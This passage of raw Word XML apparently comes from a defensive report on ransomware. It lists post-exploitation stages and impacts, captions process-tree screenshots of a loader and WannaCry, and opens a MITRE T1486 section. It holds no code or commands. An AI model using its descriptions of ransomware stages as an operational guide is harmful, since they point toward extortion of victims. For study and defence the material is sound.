        <w:t>- Generates ransom notes</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Post-Exploitation:</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Data leak publishing on dark web</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Negotiating ransom payment</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Receiving cryptocurrency payments</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59BA372C" w14:textId="77777777" w:rsidR="00B95E87" w:rsidRPr="00760E56"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4. Impact on Confidentiality, Integrity, and Availability (CIA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E822879" w14:textId="77777777" w:rsidR="0059326B" w:rsidRPr="003F1A9E" w:rsidRDefault="006E6758" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Confidentiality:</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Stolen data may be leaked, sold, or publicly exposed.</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Integrity:</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Data becomes altered or corrupted due to encryption.</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Backups may be deleted or tampered with.</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Availability:</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Systems become inaccessible.</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Operations halt due to encrypted files and unavailable services.</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>Business Risks:</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Severe financial losses</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Reputational damage</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Legal and regulatory penalties</w:t>
      </w:r>
      <w:r w:rsidRPr="00760E56">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="cs"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>- Loss of clients and long-term trust</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD40197" w14:textId="34AD9BE2" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="kk-KZ"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0342030C" wp14:editId="3702E60E">
            <wp:extent cx="5486400" cy="6724650"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1350895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5442" name="Рисунок 1350895442"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="6724650"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="107EE02A" w14:textId="77777777" w:rsidR="0059326B" w:rsidRDefault="0059326B" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BA84080" w14:textId="77777777" w:rsidR="00241148" w:rsidRDefault="00241148" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="611113C6" w14:textId="77777777" w:rsidR="00241148" w:rsidRDefault="00241148" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49592143" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="00241148" w:rsidRDefault="00241148" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="016AE7DA" w14:textId="4C44DADD" w:rsidR="0059326B" w:rsidRDefault="0059326B" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Schemas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2878B4" w14:textId="0A32DCAC" w:rsidR="0059326B" w:rsidRDefault="0059326B" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5C486CED" wp14:editId="6187B403">
            <wp:extent cx="5485714" cy="2095238"/>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5714" cy="2095238"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5313FD30" w14:textId="77777777" w:rsidR="006C3537" w:rsidRPr="003F1A9E" w:rsidRDefault="006C3537" w:rsidP="006C3537">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006C3537">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">The screenshot shows a </w:t>
      </w:r>
      <w:r w:rsidRPr="006C3537">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>process tree of malicious activity on a Windows system</w:t>
      </w:r>
      <w:r w:rsidRPr="006C3537">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="006C3537">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">An unknown executable with a hash-like filename acts as the </w:t>
      </w:r>
      <w:r w:rsidRPr="006C3537">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>parent process</w:t>
      </w:r>
      <w:r w:rsidRPr="006C3537">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> and initiates a chain of child processes. It spawns legitimate Windows utilities such as cmd.exe and conhost.exe, along with additional executable and script components used to execute commands and deliver further payloads. The diagram illustrates a typical </w:t>
      </w:r>
      <w:r w:rsidRPr="006C3537">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>malware loader execution flow</w:t>
      </w:r>
      <w:r w:rsidRPr="006C3537">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, where trusted system processes are abused to mask malicious behavior and continue the attack lifecycle.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BF2264" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="003F1A9E" w:rsidRDefault="00241148" w:rsidP="006C3537">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42A7D246" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="003F1A9E" w:rsidRDefault="00241148" w:rsidP="006C3537">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="550731B1" w14:textId="77777777" w:rsidR="00241148" w:rsidRPr="003F1A9E" w:rsidRDefault="00241148" w:rsidP="006C3537">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38E27088" w14:textId="104DC27D" w:rsidR="00241148" w:rsidRPr="007D4A97" w:rsidRDefault="0059326B" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="kk-KZ"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="kk-KZ"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="55179EBD" wp14:editId="62BDE7D3">
            <wp:extent cx="5486400" cy="2476500"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="16873102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0249" name="Рисунок 1687310249"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2476500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE3FDA8" w14:textId="77777777" w:rsidR="007D4A97" w:rsidRPr="007D4A97" w:rsidRDefault="007D4A97" w:rsidP="007D4A97">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">The screenshot depicts a </w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>process tree associated with WannaCry ransomware execution</w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">An initial malicious executable with a hash-like filename acts as the </w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>entry point</w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, spawning multiple Windows utilities such as cmd.exe, attrib.exe, and icacls.exe, which are used to modify file attributes, permissions, and execute commands. The process chain ultimately launches @wanadecryptor@.exe, the </w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>WannaCry ransomware payload</w:t>
      </w:r>
      <w:r w:rsidRPr="007D4A97">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, responsible for file encryption. The diagram highlights how the malware leverages legitimate system processes to prepare the environment, execute the ransomware component, and propagate its malicious activity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66A8AA5A" w14:textId="6285C117" w:rsidR="0025545D" w:rsidRPr="007D4A97" w:rsidRDefault="0025545D" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E1DA77C" w14:textId="6154A4C9" w:rsidR="0025545D" w:rsidRDefault="0025545D" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25F496AE" w14:textId="77777777" w:rsidR="002B036E" w:rsidRDefault="002B036E" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01C3DF33" w14:textId="77777777" w:rsidR="002B036E" w:rsidRDefault="002B036E" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="541F3BDC" w14:textId="77777777" w:rsidR="002B036E" w:rsidRDefault="002B036E" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="673CD245" w14:textId="77777777" w:rsidR="002B036E" w:rsidRDefault="002B036E" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A050B3F" w14:textId="77777777" w:rsidR="002B036E" w:rsidRDefault="002B036E" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08616F26" w14:textId="77777777" w:rsidR="002B036E" w:rsidRDefault="002B036E" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D95679D" w14:textId="77777777" w:rsidR="002B036E" w:rsidRPr="003F1A9E" w:rsidRDefault="002B036E" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08904A41" w14:textId="5D8E2559" w:rsidR="002B036E" w:rsidRPr="003F1A9E" w:rsidRDefault="00307C3A" w:rsidP="00760E56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="48"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Part 2:</w:t>
      </w:r>
      <w:r w:rsidR="007D4A97" w:rsidRPr="003F1A9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="48"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007D4A97" w:rsidRPr="005075F1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="48"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>TTPs</w:t>
      </w:r>
      <w:r w:rsidR="007D4A97" w:rsidRPr="00E20888">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="48"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007D4A97" w:rsidRPr="005075F1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="48"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidR="007D4A97" w:rsidRPr="00E20888">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="48"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007D4A97" w:rsidRPr="005075F1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="48"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Indicators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D9771C" w14:textId="7AAD965A" w:rsidR="0099170B" w:rsidRPr="00F44E1E" w:rsidRDefault="0099170B" w:rsidP="009A6F72">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F44E1E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="002B036E" w:rsidRPr="002B036E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>mpact T1486 — Data Encrypted for Impact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631058C1" w14:textId="77777777" w:rsidR="003F1A9E" w:rsidRPr="00C324AC" w:rsidRDefault="0099170B" w:rsidP="003F1A9E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00307C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
      <w:r w:rsidR="002B036E" w:rsidRPr="002B036E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="0099170B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>The T1486 technique describes cases where attackers encrypt data on a victim's device (locally or over a network) in order to deny access to it. This is often used in extortion attacks, where the encryption key is held until a ransom is paid. Sometimes encryption is used to completely destroy data.</w:t>
      </w:r>
      <w:r w:rsidR="0001310C" w:rsidRPr="0001310C">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
